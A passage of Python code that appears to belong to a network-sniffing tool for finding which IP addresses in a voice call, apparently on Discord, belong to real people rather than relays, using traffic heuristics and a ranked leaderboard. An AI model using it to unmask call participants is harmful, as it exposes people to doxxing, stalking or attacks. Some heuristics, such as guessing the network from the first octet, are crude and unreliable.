    def correlate_peers(self) -> Dict[str, List[str]]:
        """Find peers that likely participated in same call"""
        correlation = {}
        
        for session_id, data in self.sessions.items():
            ips = list(data['ips'])
            if len(ips) > 1:
                correlation[session_id] = ips
        
        return correlation

# ============================================================================
# CONFIDENCE SCORING
# ============================================================================

def calculate_confidence_score(ip: str, metrics: Dict) -> Tuple[float, str]:
    """
    Calculate confidence score (0-100) that this is a real person IP
    Returns (score, classification)
    """
    score = 0.0
    
    # Datacenter check (-40 if datacenter)
    is_dc, provider = is_datacenter_ip(ip)
    if is_dc:
        score -= 40
    else:
        score += 30
    
    # Relay/Direct check
    is_relay = metrics.get('is_relay', False)
    if not is_relay:
        score += 20
    else:
        score -= 15
    
    # VPN/Proxy check
    is_vpn = metrics.get('is_vpn', False)
    if not is_vpn:
        score += 15
    else:
        score -= 20
    
    # Jitter patterns (normal voice codecs have specific jitter)
    jitter = metrics.get('jitter', 0)
    if 0.001 < jitter < 0.05:
        score += 15
    
    # Packet rate consistency
    if metrics.get('packet_consistency', 0.8) > 0.7:
        score += 10
    
    # RTT patterns (humans != datacenters)
    rtt = metrics.get('rtt', 50)
    if 20 < rtt < 200:
        score += 10
    elif rtt > 200:
        score -= 5
    
    # Anomaly check
    is_anomalous = metrics.get('is_anomalous', False)
    if is_anomalous:
        score -= 20
    
    # Entropy patterns
    port_entropy = metrics.get('port_entropy', 0)
    if port_entropy < 0.5:  # Concentrated port usage
        score += 10
    
    # Clamp to 0-100
    score = max(0, min(100, score))
    
    # Classification
    if score >= 80:
        classification = "LIKELY_PERSON_P2P"
    elif score >= 60:
        classification = "PROBABLE_PERSON"
    elif score >= 40:
        classification = "UNCERTAIN"
    elif score >= 20:
        classification = "LIKELY_RELAY"
    else:
        classification = "DATACENTER_OR_RELAY"
    
    return score, classification

# ============================================================================
# LOGGING & BUFFERING
# ============================================================================

class BufferedLogger:
    """Buffers logs in memory with ringbuffer rotation and writes to disk periodically"""
    
    def __init__(self, csv_path: str, json_path: str, flush_interval: int = 60):
        self.csv_path = csv_path
        self.json_path = json_path
        self.flush_interval = flush_interval
        self.buffer = deque(maxlen=CONFIG['ringbuffer_max'])  # Ringbuffer - auto-rotates
        self.json_data = {
            'metadata': {
                'created': datetime.now().isoformat(),
                'platform': PLATFORM,
                'ringbuffer_enabled': True,
                'max_buffer_size': CONFIG['ringbuffer_max'],
            },
            'flows': [],
            'statistics': {},
        }
        self.last_flush = time.time()
        self.lock = threading.Lock()
        self.flush_count = 0  # Track flushes for long sessions
        # Don't init CSV yet - do it lazily on first flush to avoid blocking
    
    def _init_csv(self):
        """Initialize CSV with headers (called on first write)"""
        if not os.path.exists(self.csv_path):
            try:
                with open(self.csv_path, 'w', newline='', encoding='utf-8') as f:
                    csv.writer(f).writerow([
                        'Time', 'IP', 'Type', 'Port', 'Direction', 'Bytes'
                    ])
            except Exception:
                pass  # Silently fail on CSV init
    
    def add_log(self, **kwargs):
        """Add log entry to buffer"""
        with self.lock:
            self.buffer.append(kwargs)
            self.json_data['flows'].append(kwargs)
    
    def flush(self):
        """Write buffered logs to disk (ringbuffer-aware)"""
        with self.lock:
            if not self.buffer:
                return
            
            try:
                # Init CSV if needed
                if not hasattr(self, '_csv_inited'):
                    self._init_csv()
                    self._csv_inited = True
                
                # For ringbuffer: append to CSV (don't truncate old sessions)
                # This allows multi-session logging on long captures
                with open(self.csv_path, 'a', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    for entry in list(self.buffer):
                        writer.writerow([
                            entry.get('time', ''),
                            entry.get('ip', ''),
                            entry.get('type', ''),
                            entry.get('port', ''),
                            entry.get('direction', ''),
                            entry.get('bytes', ''),
                        ])
                
                # JSON: keep full flow list (doesn't rotate like CSV buffer)
                with open(self.json_path, 'w', encoding='utf-8') as f:
                    json.dump(self.json_data, f, indent=2, default=str)
                
                self.flush_count += 1
            
            except Exception:
                pass  # Silently fail on write errors
            
            finally:
                # Don't clear ringbuffer - it auto-rotates
                self.last_flush = time.time()
    
    def should_flush(self) -> bool:
        """Check if buffer should be flushed"""
        return (time.time() - self.last_flush > self.flush_interval or 
                len(self.buffer) > 1000)

# ============================================================================
# STATISTICS & HEATMAP
# ============================================================================

class TrafficStatistics:
    """Maintains statistics about captured traffic"""
    
    def __init__(self):
        self.ip_packet_count = defaultdict(int)
        self.ip_activity_timeline = defaultdict(deque)  # IP -> [(time, count)]
        self.port_usage = defaultdict(set)
        self.flow_count = 0
        self.start_time = datetime.now()
    
    def record_packet(self, ip: str, port: int):
        """Record packet activity"""
        self.ip_packet_count[ip] += 1
        self.port_usage[ip].add(port)
        self.flow_count += 1
        
        # Record for heatmap
        now = time.time()
        self.ip_activity_timeline[ip].append((now, 1))
        if len(self.ip_activity_timeline[ip]) > 1000:
            self.ip_activity_timeline[ip].popleft()
    
    def get_top_ips(self, n: int = 10) -> List[Tuple[str, int]]:
        """Get most active IPs"""
        return sorted(self.ip_packet_count.items(), 
                     key=lambda x: x[1], reverse=True)[:n]
    
    def get_heatmap_data(self, bucket_size: int = 10) -> Dict[str, List[int]]:
        """Generate heatmap data (packets per time bucket)"""
        heatmap = {}
        now = time.time()
        
        for ip, timeline in self.ip_activity_timeline.items():
            buckets = defaultdict(int)
            for ts, count in timeline:
                bucket_idx = int((now - ts) / bucket_size)
                buckets[bucket_idx] += count
            heatmap[ip] = [buckets.get(i, 0) for i in range(60)]
        
        return heatmap
    
    def get_statistics(self) -> Dict:
        """Get comprehensive statistics"""
        elapsed = (datetime.now() - self.start_time).total_seconds()
        top_ips = self.get_top_ips(10)
        
        return {
            'total_packets': self.flow_count,
            'total_ips': len(self.ip_packet_count),
            'elapsed_seconds': elapsed,
            'packets_per_second': self.flow_count / elapsed if elapsed > 0 else 0,
            'top_ips': [{'ip': ip, 'packets': count} for ip, count in top_ips],
        }

# ============================================================================
# PER-IP SESSION TRACKING
# ============================================================================

class IPSession:
    """Track detailed session info per IP - with behavioral profiling"""
    def __init__(self, ip: str):
        self.ip = ip
        self.first_seen = time.time()
        self.last_seen = time.time()
        self.total_packets = 0
        self.total_bytes = 0
        self.inbound_bytes = 0
        self.outbound_bytes = 0
        self.ports_used = set()
        self.direction_history = []  # List of (time, direction, bytes)
        self.packet_times = deque(maxlen=500)  # Track packet timing for consistency
        self.packet_sizes = deque(maxlen=200)  # Track packet sizes (codec detection)
        self.endpoints_contacted = set()  # Track unique endpoints (relay detection)
        self.call_session_id = None  # Which call session this IP appeared in
        self.appeared_at_call_start = False  # Did it appear when call started?
        self.stun_detected = False  # STUN binding behavior detected?
        self.rtt_estimate = 100.0  # RTT in milliseconds
        self.global_ip_set = set()  # Track if IP appears in multiple sessions
        
        # NEW: Traffic type & behavior profiling
        self.traffic_type = "unknown"  # voice, signaling, data, relay, unknown
        self.is_bidirectional = False  # Seen in both directions (hint: real peer)
        self.patch_count = 0  # Number of direction patches (relay indicator)
        self.burst_score = 0.0  # How bursty is traffic? (voice = bursty)
        self.symmetry_changes = []  # Track symmetry over time
        self.nat_candidate = False  # Behind NAT? (frequent re-pathing)
        self.relay_confidence = 0.0  # Confidence it's a relay (0-1.0)
        self.peer_confidence = 0.0  # Confidence it's a real peer (0-1.0)
        self.voice_codec_hints = set()  # Detected codecs (OPUS, G722, etc)
        self.interface_name = None  # Which interface saw this IP
        self.discovery_method = None  # How was this IP discovered? (stun, relay, direct, etc)
        
    def update(self, bytes_count: int, is_inbound: bool):
        """Update session with new packet"""
        self.last_seen = time.time()
        self.total_packets += 1
        self.total_bytes += bytes_count
        if is_inbound:
            self.inbound_bytes += bytes_count
        else:
            self.outbound_bytes += bytes_count
        self.direction_history.append((time.time(), 'in' if is_inbound else 'out', bytes_count))
    
    def add_port(self, port: int):
        """Record port used"""
        if port > 0:
            self.ports_used.add(port)
    
    def add_endpoint(self, endpoint_ip: str):
        """Track which IPs this peer communicates with (relay detection)"""
        if endpoint_ip and endpoint_ip != self.ip:
            self.endpoints_contacted.add(endpoint_ip)
    
    def get_duration(self) -> float:
        """Session duration in seconds"""
        return self.last_seen - self.first_seen
    
    def get_symmetry_ratio(self) -> float:
        """Get in/out symmetry (1.0 = perfect balance, <0.7 = asymmetric)"""
        total = self.inbound_bytes + self.outbound_bytes
        if total == 0:
            return 0.0
        min_bytes = min(self.inbound_bytes, self.outbound_bytes)
        return min_bytes / (total / 2) if total > 0 else 0.0
    
    def get_packet_consistency(self) -> float:
        """Measure consistency of packet arrival (voice pattern detection)"""
        if len(self.packet_times) < 5:
            return 0.0
        
        times = list(self.packet_times)
        intervals = [times[i+1] - times[i] for i in range(len(times)-1)]
        if not intervals:
            return 0.0
        
        avg = sum(intervals) / len(intervals)
        variance = sum((x - avg) ** 2 for x in intervals) / len(intervals)
        std_dev = (variance ** 0.5) if variance > 0 else 0.0
        
        # Lower std dev = more consistent (better for voice)
        consistency = 1.0 / (1.0 + std_dev) if std_dev >= 0 else 0.0
        return consistency
    
    def get_port_variation(self) -> float:
        """Get port usage variation (voice uses 1-2, relays use many)"""
        port_count = len(self.ports_used)
        # Normalized: 1 port = 1.0, 10+ ports = 0.0
        return max(0.0, 1.0 - (port_count - 1) / 10.0) if port_count > 0 else 0.0
    
    def detect_stun_pattern(self, src_port: int, dst_port: int) -> bool:
        """
        Detect STUN binding patterns.
        STUN candidates typically use ports in 3478-5349 range and have
        specific patterns of requests/responses.
        """
        # STUN port range for ICE candidates
        STUN_PORT_MIN = 3478
        STUN_PORT_MAX = 5349
        
        # Check if either port is in STUN range
        if STUN_PORT_MIN <= src_port <= STUN_PORT_MAX or STUN_PORT_MIN <= dst_port <= STUN_PORT_MAX:
            self.stun_detected = True
            return True
        
        # Also check for odd port patterns that might be ICE related
        # Some Discord ICE candidates use high ephemeral ports with specific characteristics
        if src_port > 50000 and dst_port >= 3478 and dst_port <= 5349:
            self.stun_detected = True
            return True
        
        return False
    
    def get_summary(self) -> str:
        """One-line session summary"""
        duration = self.get_duration()
        mb_total = self.total_bytes / (1024*1024)
        sym = self.get_symmetry_ratio()
        cons = self.get_packet_consistency()
        stun_marker = " [STUN]" if self.stun_detected else ""
        bd_marker = " [BI]" if self.is_bidirectional else ""
        relay_marker = f" [RELAY:{self.relay_confidence:.2f}]" if self.relay_confidence > 0.5 else ""
        peer_marker = f" [PEER:{self.peer_confidence:.2f}]" if self.peer_confidence > 0.5 else ""
        return f"{self.total_packets:5d}p | {mb_total:6.2f}MB | {duration:6.1f}s | Sym:{sym:.2f} | Cons:{cons:.2f}{stun_marker}{bd_marker}{relay_marker}{peer_marker}"
    
    def analyze_traffic_type(self) -> str:
        """
        FIX #18: Classify traffic type based on behavioral signals
        - Voice: Regular bursts, consistent sizes, symmetrical, low jitter
        - Signaling: Sparse, small packets, asymmetrical, variable timing
        - Data: Large steady transfers, asymmetrical
        - Relay: Multiple endpoints, pass-through pattern (asymmetric)
        - Unknown: Insufficient data
        """
        if self.total_packets < 5:
            return "unknown"
        
        # Check bidirectionality
        in_ratio = self.inbound_bytes / (self.total_bytes + 1)
        out_ratio = self.outbound_bytes / (self.total_bytes + 1)
        is_symmetric = 0.3 <= in_ratio <= 0.7
        
        # Analyze packet timing consistency
        consistency = self.get_packet_consistency()
        
        # Check burst patterns
        if len(self.packet_times) > 5:
            times = list(self.packet_times)
            intervals = [times[i+1] - times[i] for i in range(len(times)-1)]
            avg_interval = sum(intervals) / len(intervals) if intervals else 0
            
            # Voice codecs typically produce bursts every 20ms (Opus)
            is_bursty = avg_interval < 0.05 and consistency > 0.6
        else:
            is_bursty = False
        
        # Check endpoint count
        many_endpoints = len(self.endpoints_contacted) > 5
        few_endpoints = len(self.endpoints_contacted) <= 2
        
        # Calculate average packet size
        if self.total_packets > 0:
            avg_size = self.total_bytes / self.total_packets
        else:
            avg_size = 0
        
        # Classification logic
        if is_symmetric and is_bursty and few_endpoints:
            self.traffic_type = "voice"
            return "voice"
        elif is_bursty and few_endpoints and consistency > 0.5:
            self.traffic_type = "voice"
            return "voice"
        elif many_endpoints and not is_symmetric:
            self.traffic_type = "relay"
            self.relay_confidence = 0.8
            return "relay"
        elif not is_symmetric and self.total_bytes > 5_000_000:
            self.traffic_type = "data"
            return "data"
        elif is_symmetric and consistency < 0.4 and avg_size < 200:
            self.traffic_type = "signaling"
            return "signaling"
        else:
            self.traffic_type = "unknown"
            return "unknown"
    
    def calculate_peer_confidence(self) -> float:
        """
        FIX #1, #20: Don't assume traffic IP = person. Calculate confidence that
        this IP is an actual peer (not infrastructure/relay).
        
        Score components:
        - Bidirectional confirmation (20%)
        - Voice-like traffic pattern (25%)
        - Few endpoints (20%)
        - High symmetry (20%)
        - Consistent timing (15%)
        """
        if self.total_packets < 5:
            return 0.0
        
        score = 0.0
        
        # 1. Bidirectional confirmation (most important)
        if self.is_bidirectional:
            score += 0.20
        
        # 2. Traffic type
        if self.traffic_type == "voice":
            score += 0.25
        elif self.traffic_type == "signaling":
            score += 0.05
        elif self.traffic_type == "relay":
            score -= 0.20  # Penalty
        
        # 3. Endpoint count (peers talk to few IPs, relays many)
        endpoint_count = len(self.endpoints_contacted)
        if endpoint_count <= 1:
            score += 0.20
        elif endpoint_count <= 3:
            score += 0.15
        elif endpoint_count > 6:
            score -= 0.10
        
        # 4. Symmetry
        sym = self.get_symmetry_ratio()
        if 0.4 <= sym <= 0.8:
            score += 0.20
        elif 0.3 <= sym <= 0.9:
            score += 0.10
        
        # 5. Timing consistency
        consistency = self.get_packet_consistency()
        if consistency > 0.6:
            score += 0.15
        elif consistency > 0.3:
            score += 0.05
        
        # 6. STUN detection bonus
        if self.stun_detected:
            score += 0.05
        
        # 7. Minimum duration (not just a fleeting connection)
        duration = self.get_duration()
        if duration > 5:  # At least 5 seconds
            score += 0.05
        
        # Clamp to [0, 1]
        self.peer_confidence = max(0.0, min(1.0, score))
        return self.peer_confidence
    
    def calculate_relay_confidence(self) -> float:
        """
        FIX #17: Differentiate relays from peers
        Relays have:
        - Many endpoints contacted
        - Asymmetric traffic (one-way heavy)
        - No STUN signals
        - Appear at any time (not call-start)
        - Generic packet patterns
        """
        if self.total_packets < 5:
            return 0.0
        
        confidence = 0.0
        
        # Multiple endpoints = relay signature
        endpoint_count = len(self.endpoints_contacted)
        if endpoint_count > 6:
            confidence += 0.40
        elif endpoint_count > 4:
            confidence += 0.20
        
        # Asymmetric traffic
        sym = self.get_symmetry_ratio()
        if sym < 0.3:
            confidence += 0.20
        
        # No STUN signals
        if not self.stun_detected:
            confidence += 0.10
        
        # Didn't appear at call start
        if not self.appeared_at_call_start:
            confidence += 0.10
        
        # High packet variation (not voice)
        consistency = self.get_packet_consistency()
        if consistency < 0.3:
            confidence += 0.10
        
        self.relay_confidence = min(1.0, confidence)
        return self.relay_confidence


# ============================================================================
# DNS CACHING
# ============================================================================

class DNSLookupCache:
    """Cache DNS reverse lookups"""
    def __init__(self, cache_ttl: int = 3600):
        self.cache = {}
        self.cache_times = {}
        self.cache_ttl = cache_ttl
        self.lock = threading.Lock()
        
    def get(self, ip: str) -> str:
        """Get cached hostname or query DNS"""
        with self.lock:
            now = time.time()
            if ip in self.cache:
                if now - self.cache_times[ip] < self.cache_ttl:
                    return self.cache[ip]
        
        # Try DNS lookup (non-blocking, with timeout)
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            with self.lock:
                self.cache[ip] = hostname
                self.cache_times[ip] = time.time()
            return hostname
        except:
            # Cache failure too
            with self.lock:
                self.cache[ip] = ip
                self.cache_times[ip] = time.time()
            return ip

# ============================================================================
# LIVE LEADERBOARD DISPLAY
# ============================================================================

class IPRanking:
    """Score and rank all IP candidates by multiple quality criteria"""
    def __init__(self, adaptive_scorer: 'AdaptiveScorer' = None):
        self.scores = {}  # IP -> score (0.0-1.0)
        self.features = {}  # IP -> feature dict
        self.metadata = {}  # IP -> metadata dict
        self.adaptive_scorer = adaptive_scorer
        self.lock = threading.Lock()
    
    def calculate_score(self, session: 'IPSession', ip: str, metadata: dict = None, cluster_info: dict = None) -> float:
        """Calculate score using adaptive scorer if available, else fallback"""
        if self.adaptive_scorer:
            return self.adaptive_scorer.score_ip(ip, session, metadata or {}, cluster_info)
        
        # Fallback to traditional scoring
        score = 0.0
        
        consistency = session.get_packet_consistency()
        if consistency > 0.5:
            score += 0.2 * min(1.0, consistency / 0.8)
        
        if session.total_packets >= 20 and session.total_bytes >= 100*1024:
            activity_score = min(1.0, session.total_packets / 100)
            score += 0.2 * activity_score
        
        symmetry = session.get_symmetry_ratio()
        if symmetry > 0.5:
            score += 0.3 * symmetry
        
        duration = session.get_duration()
        if duration >= 10:
            score += 0.1 * min(1.0, duration / 60)
        
        endpoint_count = len(session.endpoints_contacted)
        if endpoint_count <= 3:
            endpoint_score = 1.0
        elif endpoint_count <= 5:
            endpoint_score = 0.5
        else:
            endpoint_score = 0.0
        score += 0.2 * endpoint_score
        
        return min(1.0, max(0.0, score))
    
    def update_all(self, ip_sessions: Dict[str, 'IPSession'], metadata_map: Dict[str, dict] = None, cluster_map: Dict[str, dict] = None):
        """Recalculate scores for all IPs with enrichment data"""
        with self.lock:
            self.scores = {}
            self.features = {}
            self.metadata = metadata_map or {}
            
            for ip, session in ip_sessions.items():
                meta = (metadata_map or {}).get(ip, {})
                cluster = (cluster_map or {}).get(ip, {})
                self.scores[ip] = self.calculate_score(session, ip, meta, cluster)
                self.features[ip] = BehaviorFeatureExtractor.extract_features(session) if hasattr(BehaviorFeatureExtractor, 'extract_features') else {}
    
    def get_top_ips(self, count: int = 15) -> List[Tuple[str, float]]:
        """Get top N IPs by score"""
        with self.lock:
            sorted_ips = sorted(
                self.scores.items(),
                key=lambda x: x[1],
                reverse=True
            )
            return sorted_ips[:count]
    
    def get_score(self, ip: str) -> float:
        """Get score for specific IP"""
        with self.lock:
            return self.scores.get(ip, 0.0)
    
    def get_features(self, ip: str) -> dict:
        """Get extracted features for IP"""
        with self.lock:
            return self.features.get(ip, {})

class LiveLeaderboard:
    """Display top ranked IPs every N seconds with quality scores"""
    def __init__(self, display_interval: int = 10, metadata_enricher: 'MetadataEnricher' = None):
        self.display_interval = display_interval
        self.last_display = 0
        self.ip_sessions = {}  # IP -> IPSession
        self.ranking = IPRanking()  # Score-based ranking
        self.metadata_enricher = metadata_enricher
        self.lock = threading.Lock()
    
    def update_ip(self, ip: str, bytes_count: int, is_inbound: bool, port: int = 0):
        """Update session for IP"""
        with self.lock:
            if ip not in self.ip_sessions:
                self.ip_sessions[ip] = IPSession(ip)
            session = self.ip_sessions[ip]
            session.update(bytes_count, is_inbound)
            session.add_port(port)
    
    def should_display(self) -> bool:
        """Check if it's time to display"""
        now = time.time()
        if now - self.last_display >= self.display_interval:
            self.last_display = now
            return True
        return False
    
    def display(self):
        """Show live leaderboard with quality rankings"""
        with self.lock:
            if not self.ip_sessions:
                return
            
            # Update rankings based on all current IPs
            self.ranking.update_all(self.ip_sessions)
            
            # Get top ranked IPs
            top_ips = []
            with self.ranking.lock:
                sorted_ips = sorted(
                    self.ranking.scores.items(),
                    key=lambda x: x[1],
                    reverse=True
                )
                top_ips = sorted_ips[:15]
            
            if not top_ips:
                return
            
            print("\n" + "="*120)
            print(f"RANKED P2P CANDIDATES (Real-time Quality Score)")
            print("="*120)
            print(f"{'Rank':<5} {'IP':<18} {'Score':<8} {'Packets':<8} {'Data':<10} {'In↓/Out↑':<15} {'Duration':<9} {'Endpoints':<10} {'Role':<15}")
            print("-"*120)
            
            for rank, (ip, score) in enumerate(top_ips, 1):
                session = self.ip_sessions[ip]
                total_mb = session.total_bytes / (1024*1024)
                in_mb = session.inbound_bytes / (1024*1024)
                out_mb = session.outbound_bytes / (1024*1024)
                duration = session.get_duration()
                endpoints = len(session.endpoints_contacted)
                
                # Visual quality indicator
                if score >= 0.75:
                    quality = "★★★ EXCELLENT"
                elif score >= 0.60:
                    quality = "★★  GOOD"
                elif score >= 0.40:
                    quality = "★   FAIR"
                else:
                    quality = "   POOR"
                
                role = 'RELAY' if session.relay_confidence > 0.5 else 'PEER' if session.peer_confidence > 0.5 else session.traffic_type.upper()
                
                print(f"{rank:<5} {ip:<18} {score:>6.3f}  {session.total_packets:<8} {total_mb:>7.2f}MB {in_mb:>6.2f}↓/{out_mb:>6.2f}↑ {duration:>7.1f}s {endpoints:<10} {role:<15}")
            
            print("="*120)

# ============================================================================
# BEHAVIORAL FEATURE EXTRACTION
# ============================================================================

class BehaviorFeatureExtractor:
    """Extract behavioral features from packet timings and traffic patterns"""
    
    @staticmethod
    def extract_features(session: 'IPSession') -> dict:
        """
        Extract comprehensive behavioral features from a session.
        These features are used for ML-based IP scoring.
        """
        features = {
            # Timing features
            'packet_interval_mean': 0.0,
            'packet_interval_std': 0.0,  # Jitter measure
            'packet_interval_min': 0.0,
            'packet_interval_max': 0.0,
            
            # Burst detection
            'burst_count': 0,
            'burst_intensity': 0.0,
            'max_burst_size': 0,
            
            # Traffic balance
            'symmetry_ratio': 0.0,
            'inbound_outbound_ratio': 0.0,
            
            # Port behavior
            'port_count': 0,
            'port_volatility': 0.0,  # How much ports change
            'primary_port_percent': 0.0,
            
            # Activity profile
            'total_packets': session.total_packets,
            'total_bytes': session.total_bytes,
            'duration': session.get_duration(),
            'bytes_per_second': 0.0,
            'packets_per_second': 0.0,
            
            # Connectivity
            'endpoint_count': len(session.endpoints_contacted),
            'endpoint_diversity': 0.0,
            
            # Voice call indicators
            'is_likely_voice_call': False,
            'voice_confidence': 0.0,
        }
        
        # Calculate timing features from packet_times
        if len(session.packet_times) > 2:
            times = list(session.packet_times)
            intervals = [times[i+1] - times[i] for i in range(len(times)-1)]
            
            if intervals:
                avg_interval = sum(intervals) / len(intervals)
                features['packet_interval_mean'] = avg_interval
                features['packet_interval_min'] = min(intervals)
                features['packet_interval_max'] = max(intervals)
                
                # Standard deviation (jitter)
                variance = sum((x - avg_interval)**2 for x in intervals) / len(intervals)
                features['packet_interval_std'] = variance ** 0.5
        
        # Burst detection - look for rapid packet sequences
        if len(session.packet_times) > 10:
            times = list(session.packet_times)
            burst_threshold = 0.05  # 50ms
            current_burst = 0
            max_burst = 0
            burst_count = 0
            
            for i in range(len(times)-1):
                if times[i+1] - times[i] < burst_threshold:
                    current_burst += 1
                    max_burst = max(max_burst, current_burst)
                else:
                    if current_burst > 2:
                        burst_count += 1
                    current_burst = 0
            
            features['burst_count'] = burst_count
            features['max_burst_size'] = max_burst
            features['burst_intensity'] = max_burst / max(1, len(times) / 10)
        
        # Traffic balance features
        features['symmetry_ratio'] = session.get_symmetry_ratio()
        total = session.inbound_bytes + session.outbound_bytes
        if total > 0:
            features['inbound_outbound_ratio'] = session.inbound_bytes / total
        
        # Port features
        features['port_count'] = len(session.ports_used)
        if features['port_count'] > 0:
            # Primary port (most used)
            port_usage = {}
            # This would need packet-level data, estimate from count
            features['primary_port_percent'] = 0.9 if features['port_count'] == 1 else 0.7 if features['port_count'] == 2 else 0.4
        
        # Activity rates
        if features['duration'] > 0:
            features['bytes_per_second'] = features['total_bytes'] / features['duration']
            features['packets_per_second'] = features['total_packets'] / features['duration']
        
        # Endpoint diversity
        max_endpoints = 10  # Normalize
        features['endpoint_diversity'] = min(1.0, features['endpoint_count'] / max_endpoints)
        
        # Voice call detection
        features['is_likely_voice_call'] = BehaviorFeatureExtractor.detect_voice_pattern(features)
        features['voice_confidence'] = BehaviorFeatureExtractor.calculate_voice_confidence(features)
        
        return features
    
    @staticmethod
    def detect_voice_pattern(features: dict) -> bool:
        """
        Heuristic to detect if traffic pattern matches VoIP/Discord voice.
        Voice calls have:
        - Consistent packet frequency (low jitter)
        - Regular burst patterns
        - Balanced bidirectional traffic
        - Few endpoints
        """
        conditions = []
        
        # Low jitter indicates steady voice stream
        if features['packet_interval_std'] > 0 and features['packet_interval_std'] < 0.05:
            conditions.append(True)
        
        # Regular bursts from voice codec
        if features['burst_count'] > 2 and features['max_burst_size'] < 20:
            conditions.append(True)
        
        # Balanced traffic
        if 0.3 < features['symmetry_ratio'] < 0.7:
            conditions.append(True)
        
        # Few endpoints (not relay)
        if features['endpoint_count'] <= 3:
            conditions.append(True)
        
        # Reasonable packet rate for voice (20-100 pps typical)
        if 10 < features['packets_per_second'] < 200:
            conditions.append(True)
        
        return sum(conditions) >= 3  # At least 3 of 5 indicators
    
    @staticmethod
    def calculate_voice_confidence(features: dict) -> float:
        """Calculate confidence score that this IP is a voice call participant"""
        score = 0.0
        max_score = 0.0
        
        # Jitter (lower is better for voice)
        if features['packet_interval_std'] > 0:
            jitter_score = 1.0 / (1.0 + (features['packet_interval_std'] / 0.01))
            score += jitter_score * 20
            max_score += 20
        
        # Burst pattern (voice codec bursts)
        if features['max_burst_size'] > 0:
            burst_score = 1.0 if (3 < features['max_burst_size'] < 30) else 0.5
            score += burst_score * 15
            max_score += 15
        
        # Symmetry (should be balanced)
        symmetry_score = 1.0 - abs(features['symmetry_ratio'] - 0.5) * 2
        score += symmetry_score * 20
        max_score += 20
        
        # Not a relay (few endpoints)
        endpoint_score = 1.0 if features['endpoint_count'] <= 2 else 0.7 if features['endpoint_count'] <= 4 else 0.2
        score += endpoint_score * 20
        max_score += 20
        
        # Activity level (not too sparse, not too heavy)
        if 1000 <  features['total_bytes'] < 50*1024*1024:
            activity_score = 1.0
        else:
            activity_score = 0.5
        score += activity_score * 25
        max_score += 25
        
        return (score / max_score) if max_score > 0 else 0.0

# ============================================================================
# METADATA ENRICHMENT (ASN, DNS)
# ============================================================================

class MetadataEnricher:
    """Enrich IPs with ASN and DNS metadata"""
    
    def __init__(self):
        self.asn_cache = {}  # IP -> ASN info
        self.dns_cache = {}  # IP -> Hostname
    
    def enrich(self, ip: str) -> dict:
        """Get all metadata for an IP"""
        return {
            'asn': self.get_asn(ip),
            'hostname': self.get_hostname(ip),
            'is_datacenter': self._is_datacenter_asn(ip),
            'is_residential': self._is_residential_asn(ip),
        }
    
    def get_asn(self, ip: str) -> str:
        """Get ASN for IP (cached, no external calls)"""
        if ip in self.asn_cache:
            return self.asn_cache[ip]
        
        # Simple heuristic based on first octets
        try:
            first_oct = int(ip.split('.')[0])
            if first_oct in [1, 8, 11, 12, 13, 14, 15, 17, 18, 19, 20, 22, 26, 28, 35, 40, 44, 45, 50, 52]:
                asn = "AS-TIER1"
            else:
                asn = "AS-UNKNOWN"
        except:
            asn = "AS-UNKNOWN"
        
        self.asn_cache[ip] = asn
        return asn
    
    def get_hostname(self, ip: str) -> str:
        """Get reverse DNS hostname (cached, no external calls)"""
        if ip in self.dns_cache:
            return self.dns_cache[ip]
        
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            self.dns_cache[ip] = hostname
            return hostname
        except:
            hostname = ip
            self.dns_cache[ip] = hostname
            return hostname

    def _is_datacenter_asn(self, ip: str) -> bool:
        """Check if IP likely belongs to a datacenter"""
        asn = self.get_asn(ip)
        dc_keywords = ['CLOUD', 'GOOGLE', 'AMAZON', 'AZURE', 'CLOUDFLARE', 'FASTLY', 'AKAMAI']
        return any(kw in asn.upper() for kw in dc_keywords)
    
    def _is_residential_asn(self, ip: str) -> bool:
        """Check if IP likely belongs to residential ISP"""
        asn = self.get_asn(ip)
        res_keywords = ['ISP', 'COMCAST', 'VERIZON', 'ATT', 'CHARTER', 'SPECTRUM', 'RESIDENTIAL']
        return any(kw in asn.upper() for kw in res_keywords)

# ============================================================================
# TRAFFIC CLUSTERING & CORRELATION
# ============================================================================

class TrafficClusterer:
    """Cluster traffic to separate relays from endpoints"""
    
    def __init__(self):
        self.clusters = {}  # cluster_id -> set of IPs
        self.cluster_id_counter = 0
    
    def cluster_ips(self, ip_sessions: Dict[str, 'IPSession']) -> Dict[str, int]:
        """
        Cluster IPs based on connectivity patterns.
        Relays typically contact many different IPs.
        Endpoints form tighter clusters.
        
        Returns: IP -> cluster_id mapping
        """
        ip_to_cluster = {}
        
        # Simple clustering: IPs with similar endpoint contacts go in same cluster
        endpoint_signatures = defaultdict(set)
        
        for ip, session in ip_sessions.items():
            # Create signature of endpoints
            sig = frozenset(sorted(session.endpoints_contacted))
            endpoint_signatures[sig].add(ip)
        
        # Assign clusters
        for sig, ips in endpoint_signatures.items():
            cluster_id = self.cluster_id_counter
            self.cluster_id_counter += 1
            self.clusters[cluster_id] = ips
            
            for ip in ips:
                ip_to_cluster[ip] = cluster_id
        
        return ip_to_cluster
    
    def get_cluster_stats(self, cluster_id: int, ip_sessions: Dict[str, 'IPSession']) -> dict:
        """Get statistics for a cluster"""
        if cluster_id not in self.clusters:
            return {}
        
        ips_in_cluster = self.clusters[cluster_id]
        total_packets = sum(ip_sessions[ip].total_packets for ip in ips_in_cluster if ip in ip_sessions)
        total_bytes = sum(ip_sessions[ip].total_bytes for ip in ips_in_cluster if ip in ip_sessions)
        
        return {
            'cluster_id': cluster_id,
            'ip_count': len(ips_in_cluster),
            'total_packets': total_packets,
            'total_bytes': total_bytes,
            'likely_relay': len(ips_in_cluster) > 5,  # Heuristic
        }

# ============================================================================
# PEER GRAPH ANALYSIS - FIX #5: Session coupling, #6: src/dst relationships
# ============================================================================

class PeerGraph:
    """
    Build a bidirectional peer graph to answer:
    - Who talks to whom? (src/dst relationships)
    - Are they bidirectional? (real peer indicator)
    - Are they grouped? (session-level grouping)
    """
    def __init__(self):
        self.edges = defaultdict(set)  # ip1 -> set(ip2, ip3, ...)
        self.edge_properties = {}  # (ip1, ip2) -> {bytes, packets, directions}
        self.bidirectional_pairs = set()  # ((ip1, ip2), (ip2, ip1)) = confirmed peer pair
    
    def add_edge(self, src_ip: str, dst_ip: str, bytes_count: int, direction: str):
        """Record communication: src -> dst"""
        if src_ip == dst_ip or not src_ip or not dst_ip:
            return
        
        # Add directed edge
        self.edges[src_ip].add(dst_ip)
        
        # Track edge properties
        key = (src_ip, dst_ip)
